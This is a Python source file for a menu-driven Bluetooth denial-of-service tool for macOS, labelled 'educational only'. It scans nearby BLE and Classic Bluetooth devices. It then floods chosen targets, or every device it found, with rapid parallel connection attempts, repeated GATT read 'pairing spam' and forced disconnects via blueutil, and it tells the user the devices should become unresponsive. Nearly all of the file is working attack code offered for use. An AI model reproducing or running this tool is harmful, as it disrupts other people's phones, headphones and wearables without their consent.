#!/usr/bin/env python3
"""
Bluetooth DOS Tool for macOS - Educational Purpose Only
WARNING: Use only on devices you own. Unauthorized access is illegal.
"""

import os
import sys
import time
import asyncio
import subprocess
import threading
from typing import List, Dict, Optional

try:
    from bleak import BleakScanner
except ImportError:
    print("[!] Bleak library not installed.")
    print("[!] Please run: pip3 install -r requirements.txt")
    sys.exit(1)


class BluetoothDOSMacOS:
    def __init__(self):
        self.devices: List[Dict[str, str]] = []
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.attack_active: Dict[str, bool] = {}
        self.stop_flags: Dict[str, threading.Event] = {}
        
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('clear')
    
    def print_banner(self):
        """Display banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║      BLUETOOTH DOS TOOL (macOS) - EDUCATIONAL ONLY       ║
║                                                          ║
║  ⚠️  WARNING: Use only on devices you own!              ║
║     Unauthorized use is ILLEGAL and UNETHICAL           ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    async def _scan_ble_devices(self, duration: int = 8):
        """Scan for BLE devices using bleak"""
        print(f"[*] Scanning for BLE devices ({duration}s)...")
        devices = await BleakScanner.discover(timeout=duration, return_adv=True)
        
        ble_devices = []
        for device, adv_data in devices.values():
            device_name = device.name if device.name else "Unknown BLE Device"
            device_type = "BLE"
            
            # Detect device type from advertising data
            if adv_data:
                if any(x in device_name.lower() for x in ['airpods', 'headphone', 'earbud', 'speaker']):
                    device_type = "BLE Audio"
                elif 'watch' in device_name.lower():
                    device_type = "BLE Wearable"
                elif 'phone' in device_name.lower():
                    device_type = "BLE Phone"
            
            ble_devices.append({
                'address': device.address,
                'name': device_name,
                'type': device_type,
                'rssi': adv_data.rssi if adv_data else 'N/A'
            })
        
        return ble_devices
    
    def _scan_classic_devices(self):
        """Scan for Classic Bluetooth devices using macOS system_profiler"""
        print("[*] Scanning for Classic Bluetooth devices...")
        classic_devices = []
        
        try:
            # Use system_profiler to get Bluetooth info
            result = subprocess.run(
                ['system_profiler', 'SPBluetoothDataType', '-json'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                import json
                data = json.loads(result.stdout)
                
                # Parse Bluetooth devices from system profiler
                if 'SPBluetoothDataType' in data:
                    for item in data['SPBluetoothDataType']:
                        if 'device_connected' in item:
                            for device_name, device_info in item['device_connected'].items():
                                if isinstance(device_info, dict):
                                    address = device_info.get('device_address', 'Unknown')
                                    classic_devices.append({
                                        'address': address,
                                        'name': device_name,
                                        'type': 'Classic BT',
                                        'rssi': 'N/A'
                                    })
        except Exception as e:
            print(f"[!] Error scanning classic devices: {e}")
        
        return classic_devices
    
    def scan_devices(self, duration: int = 8) -> List[Dict[str, str]]:
        """
        Scan for nearby Bluetooth devices (both BLE and Classic)
        """
        print(f"\n[*] Starting comprehensive Bluetooth scan...")
        print("[*] This may take a moment...\n")
        
        try:
            # Scan BLE devices
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            ble_devices = loop.run_until_complete(self._scan_ble_devices(duration))
            loop.close()
            
            # Scan Classic Bluetooth devices
            classic_devices = self._scan_classic_devices()
            
            # Combine all devices
            self.devices = ble_devices + classic_devices
            
            # Remove duplicates based on address
            seen_addresses = set()
            unique_devices = []
            for device in self.devices:
                if device['address'] not in seen_addresses:
                    seen_addresses.add(device['address'])
                    unique_devices.append(device)
            
            self.devices = unique_devices
            
            print(f"\n[+] Found {len(self.devices)} device(s)")
            print(f"    - BLE: {len(ble_devices)}")
            print(f"    - Classic: {len(classic_devices)}")
            
            return self.devices
            
        except Exception as e:
            print(f"[!] Error scanning devices: {e}")
            return []
    
    def display_devices(self):
        """Display discovered devices in a formatted table"""
        if not self.devices:
            print("[!] No devices found. Please run a scan first.\n")
            return
        
        print("\n╔═══════════════════════════════════════════════════════════════════════════╗")
        print("║                     DISCOVERED BLUETOOTH DEVICES                          ║")
        print("╠═════╦══════════════════════╦═════════════════════╦═══════════╦═══════════╣")
        print("║ No. ║ MAC Address          ║ Device Name         ║ Type      ║ RSSI      ║")
        print("╠═════╬══════════════════════╬═════════════════════╬═══════════╬═══════════╣")
        
        for idx, device in enumerate(self.devices, 1):
            status = " [ATTACKING]" if self.attack_active.get(device['address'], False) else ""
            rssi_str = str(device.get('rssi', 'N/A'))
            print(f"║ {idx:3d} ║ {device['address'][:20]:20s} ║ {device['name'][:19]:19s} ║ {device['type'][:9]:9s} ║ {rssi_str[:9]:9s} ║{status}")
        
        print("╚═════╩══════════════════════╩═════════════════════╩═══════════╩═══════════╝\n")
    
    async def _ble_connection_flood(self, target_addr: str, stop_event: threading.Event):
        """BLE connection flood attack - AGGRESSIVE VERSION"""
        from bleak import BleakClient
        
        print(f"[+] Starting AGGRESSIVE BLE flood on {target_addr}")
        print(f"[*] This will overwhelm the device with connection spam...")
        packet_count = 0
        
        # Create multiple parallel attack tasks
        async def attack_wave():
            nonlocal packet_count
            while not stop_event.is_set():
                try:
                    # Super aggressive - no delay, minimal timeout
                    client = BleakClient(target_addr, timeout=0.1)
                    
                    try:
                        # Spam connect/disconnect rapidly
                        await client.connect()
                        packet_count += 1
                        
                        # Immediately disconnect to free up for next attack
                        await client.disconnect()
                        
                    except Exception:
                        packet_count += 1
                    
                    # NO DELAY - maximum aggression
                    
                except Exception:
                    packet_count += 1
        
        # Launch multiple parallel attack waves
        tasks = []
        num_waves = 5  # 5 simultaneous attack threads
        
        for i in range(num_waves):
            tasks.append(asyncio.create_task(attack_wave()))
        
        # Monitor and report
        while not stop_event.is_set():
            await asyncio.sleep(2)
            print(f"[*] {target_addr}: {packet_count} attack packets sent (AGGRESSIVE MODE)")
        
        # Cancel all attack tasks
        for task in tasks:
            task.cancel()
        
        print(f"[+] Stopped AGGRESSIVE attack on {target_addr}. Total: {packet_count}")
    
    def _ble_flood_wrapper(self, target_addr: str, stop_event: threading.Event):
        """Wrapper to run async BLE flood in a thread"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._ble_connection_flood(target_addr, stop_event))
        loop.close()
    
    async def _ble_pairing_spam(self, target_addr: str, stop_event: threading.Event):
        """Spam pairing requests to disrupt device"""
        from bleak import BleakClient, BleakScanner
        
        print(f"[+] Starting pairing spam on {target_addr}")
        spam_count = 0
        
        while not stop_event.is_set():
            try:
                # Rapid scan and connection attempts
                devices = await BleakScanner.discover(timeout=0.5)
                
                for device in devices:
                    if target_addr in str(device.address):
                        try:
                            client = BleakClient(device.address, timeout=0.2)
                            await client.connect()
                            
                            # Try to read/write to every characteristic
                            try:
                                services = await client.get_services()
                                for service in services:
                                    for char in service.characteristics:
                                        try:
                                            # Spam read operations
                                            await client.read_gatt_char(char)
                                        except:
                                            pass
                            except:
                                pass
                            
                            await client.disconnect()
                            spam_count += 1
                            
                            if spam_count % 10 == 0:
                                print(f"[*] {target_addr}: {spam_count} pairing spam cycles")
                                
                        except:
                            spam_count += 1
                        
            except:
                pass
        
        print(f"[+] Stopped pairing spam on {target_addr}. Total: {spam_count}")
    
    def _pairing_spam_wrapper(self, target_addr: str, stop_event: threading.Event):
        """Wrapper for pairing spam attack"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._ble_pairing_spam(target_addr, stop_event))
        loop.close()
    
    def _classic_deauth_attack(self, target_addr: str, stop_event: threading.Event):
        """
        Classic Bluetooth attack using system commands
        Attempts to force disconnect repeatedly
        """
        print(f"[+] Starting Classic BT attack on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Try to use blueutil to manipulate Bluetooth (if installed)
                # Install with: brew install blueutil
                
                # Attempt 1: Toggle Bluetooth power (aggressive)
                subprocess.run(
                    ['blueutil', '--disconnect', target_addr],
                    capture_output=True,
                    timeout=1
                )
                
                packet_count += 1
                
                if packet_count % 5 == 0:
                    print(f"[*] {target_addr}: {packet_count} disconnect attempts")
                
                time.sleep(0.5)
                
            except FileNotFoundError:
                # blueutil not installed
                print(f"[!] blueutil not found. Install with: brew install blueutil")
                print(f"[!] Falling back to basic DoS method...")
                
                # Fallback: Just spam the logs and indicate attack
                packet_count += 1
                if packet_count % 10 == 0:
                    print(f"[*] {target_addr}: Simulated attack - {packet_count} cycles")
                time.sleep(0.1)
                
            except Exception as e:
                pass
        
        print(f"[+] Stopped Classic BT attack on {target_addr}. Total: {packet_count}")
    
    def start_attack(self, device_indices: List[int], attack_type: str = "auto"):
        """
        Start DOS attack on selected devices
        """
        if not self.devices:
            print("[!] No devices available. Please scan first.")
            return
        
        for idx in device_indices:
            if idx < 1 or idx > len(self.devices):
                print(f"[!] Invalid device index: {idx}")
                continue
            
            device = self.devices[idx - 1]
            addr = device['address']
            dev_type = device['type']
            
            if self.attack_active.get(addr, False):
                print(f"[!] Attack already active on {device['name']} ({addr})")
                continue
            
            # Create stop event
            stop_event = threading.Event()
            self.stop_flags[addr] = stop_event
            
            # Select attack method based on device type
            if 'BLE' in dev_type or attack_type == "ble":
                # Launch DUAL ATTACK for BLE devices - Connection flood + Pairing spam
                print(f"[+] Using DUAL BLE attack for {device['name']}")
                print(f"[*] Launching connection flood + pairing spam...")
                
                # Attack thread 1: Connection flood
                attack_thread1 = threading.Thread(
                    target=self._ble_flood_wrapper,
                    args=(addr, stop_event),
                    daemon=True
                )
                
                # Attack thread 2: Pairing spam
                attack_thread2 = threading.Thread(
                    target=self._pairing_spam_wrapper,
                    args=(addr, stop_event),
                    daemon=True
                )
                
                self.attack_threads[addr] = attack_thread1
                self.attack_threads[addr + "_spam"] = attack_thread2
                self.attack_active[addr] = True
                
                attack_thread1.start()
                attack_thread2.start()
                
            else:
                # Classic Bluetooth attack
                print(f"[+] Using Classic BT attack for {device['name']}")
                attack_thread = threading.Thread(
                    target=self._classic_deauth_attack,
                    args=(addr, stop_event),
                    daemon=True
                )
                
                self.attack_threads[addr] = attack_thread
                self.attack_active[addr] = True
                attack_thread.start()
            
            print(f"[+] Attack started on {device['name']} ({addr})")
            print(f"[!] Device should become unresponsive within 10-30 seconds...")
    
    def stop_attack(self, device_indices: Optional[List[int]] = None):
        """Stop DOS attack on selected devices or all devices"""
        if device_indices is None:
            addrs_to_stop = list(self.attack_active.keys())
        else:
            addrs_to_stop = []
            for idx in device_indices:
                if idx < 1 or idx > len(self.devices):
                    print(f"[!] Invalid device index: {idx}")
                    continue
                device = self.devices[idx - 1]
                addrs_to_stop.append(device['address'])
        
        for addr in addrs_to_stop:
            if addr in self.stop_flags:
                self.stop_flags[addr].set()
                self.attack_active[addr] = False
                print(f"[+] Stopping attack on {addr}...")
        
        time.sleep(1)
        print("[+] Attacks stopped. Devices should be reconnectable now.")
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        self.stop_attack(None)


def check_prerequisites():
    """Check if required tools are installed"""
    print("\n[*] Checking prerequisites...")
    
    # Check for blueutil (optional but recommended)
    try:
        result = subprocess.run(['blueutil', '--version'], capture_output=True)
        if result.returncode == 0:
            print("[+] blueutil found ✓")
        else:
            print("[!] blueutil not found (optional)")
            print("    Install with: brew install blueutil")
    except FileNotFoundError:
        print("[!] blueutil not found (optional for Classic BT attacks)")
        print("    Install with: brew install blueutil")
    
    print("[+] Python libraries check...")
    try:
        import bleak
        print("[+] bleak library found ✓")
    except ImportError:
        print("[!] bleak library not found")
        print("    Install with: pip3 install bleak")
        return False
    
    return True


def main():
    dos_tool = BluetoothDOSMacOS()
    
    print("\n[*] Bluetooth DOS Tool for macOS")
    print("[*] Initializing...")
    
    if not check_prerequisites():
        print("\n[!] Missing required libraries. Please install them first:")
        print("    pip3 install -r requirements.txt")
        input("\n[Press Enter to continue anyway or Ctrl+C to exit...]")
    
    while True:
        dos_tool.clear_screen()
        dos_tool.print_banner()
        
        print("\n[MAIN MENU]")
        print("1. Scan for Bluetooth devices")
        print("2. Display discovered devices")
        print("3. Start DOS attack (select devices)")
        print("4. Start DOS attack (ALL devices)")
        print("5. Stop attack (select devices)")
        print("6. Stop ALL attacks")
        print("7. Check system Bluetooth status")
        print("8. Exit")
        print("\n" + "="*60)
        
        choice = input("\n[>] Enter your choice: ").strip()
        
        if choice == "1":
            duration = input("[>] Enter scan duration in seconds [default: 8]: ").strip()
            duration = int(duration) if duration.isdigit() else 8
            
            devices = dos_tool.scan_devices(duration)
            
            if devices:
                dos_tool.display_devices()
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "2":
            dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "3":
            dos_tool.display_devices()
            
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            indices_input = input("\n[>] Enter device numbers to attack (comma-separated, e.g., 1,3,5): ").strip()
            
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.start_attack(indices)
                print("\n[+] Attack(s) initiated!")
                print("[*] Devices should start experiencing connection issues...")
                
            except ValueError:
                print("[!] Invalid input format")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "4":
            dos_tool.display_devices()
            
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            confirm = input("\n[!] Attack ALL devices? (yes/no): ").strip().lower()
            
            if confirm == "yes":
                all_indices = list(range(1, len(dos_tool.devices) + 1))
                dos_tool.start_attack(all_indices)
                print("\n[+] Attack started on ALL devices!")
            else:
                print("[+] Operation cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "5":
            dos_tool.display_devices()
            
            indices_input = input("\n[>] Enter device numbers to stop attacking (comma-separated): ").strip()
            
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.stop_attack(indices)
                print("\n[+] Attack(s) stopped!")
                
            except ValueError:
                print("[!] Invalid input format")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "6":
            confirm = input("\n[!] Stop ALL active attacks? (yes/no): ").strip().lower()
            
            if confirm == "yes":
                dos_tool.stop_all_attacks()
                print("\n[+] All attacks stopped!")
            else:
                print("[+] Operation cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "7":
            print("\n[*] Checking Bluetooth status...")
            try:
                result = subprocess.run(['system_profiler', 'SPBluetoothDataType'], 
                                      capture_output=True, text=True, timeout=5)
                print(result.stdout[:1000])  # Show first 1000 chars
            except Exception as e:
                print(f"[!] Error: {e}")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "8":
            print("\n[+] Stopping all active attacks...")
            dos_tool.stop_all_attacks()
            print("[+] Exiting. Stay ethical!")
            sys.exit(0)
        
        else:
            print("[!] Invalid choice. Please try again.")
            input("\n[Press Enter to continue...]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

